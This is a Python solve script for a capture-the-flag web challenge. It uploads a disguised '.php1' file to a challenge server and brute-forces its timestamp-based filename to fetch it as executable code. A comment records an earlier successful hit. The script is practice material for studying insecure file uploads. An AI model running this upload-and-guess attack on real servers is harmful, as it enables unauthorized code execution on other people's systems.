import requests
from datetime import datetime
from time import sleep

BASE_URL = "http://challs1.nusgreyhats.org:5207/"
FILE = "fake.php1"
DATE = "20210814" 

NOW = datetime.now()
DATE = NOW.strftime("%Y%m%d")
HOUR = (int(NOW.strftime("%H")) - 8) % 24 # to match with server time
MIN = int(NOW.strftime("%M"))
SEC = int(NOW.strftime("%S"))

SESSION = requests.Session()
SESSION.get(BASE_URL)

# collection to check range of time unit values explored
sec_set = set()
min_set = set()
hour_set = set()

# post file to upload
def post_file(file):
    file_map = {
        "upload_file": (file, open(file, "r"), "application/octet-stream"),
        'submit': (None, 'trust_me_this_is_not_flag')
    }

    site = SESSION.post(BASE_URL + "upload.php", 
        files=file_map)

    if site.status_code != 200:
        print("UPLOAD FAIL!")
        print(site.text)
        exit(1)

# check file
def check_file(ext):
    for num in range(10, 99 + 1): # follow rand(10, 99) function
        for sec_delay in range(-4, 1 + 1): # second range incase of delay of post request
            sec = SEC + sec_delay
            minute = MIN
            hour = HOUR

            if sec < 0:
                sec = sec % 60
                minute = MIN - 1
            if minute < 0:
                minute = minute % 60
                hour = (hour - 1) % 24

            sec_set.add(sec)
            min_set.add(minute)
            hour_set.add(hour)

            filename = str(num) + DATE + \
                str(hour).zfill(2) + \
                str(minute).zfill(2) + \
                str(sec).zfill(2) + ext
            path = "upload/" + filename
            print(f"GET /path")

            site = SESSION.get(BASE_URL + path)
            page = site.text
            if 'Not Found' not in page:
                print("PAGE FOUND")
                print(page)
                return # exit function

    print(f"sec range : {sec_set}")
    print(f"min range : {min_set}")
    print(f"hour range: {hour_set}")
    print("NOT FOUND!\n")
    exit(1)

# main logic
def main():
    print(f"START @ {HOUR}:{MIN}:{SEC}")
    print(f"Feeding file '{FILE}'")

    post_file(FILE)
    sleep(0.2) # give some time for site to process and save
    check_file(".php1")

    exit(0)

# driver code
if __name__ == "__main__":
    main()

# prevous find:
# local time 18hrs, server time 10hrs
# 1920210814103705.php1
# PAGE FOUND
# <?='dir';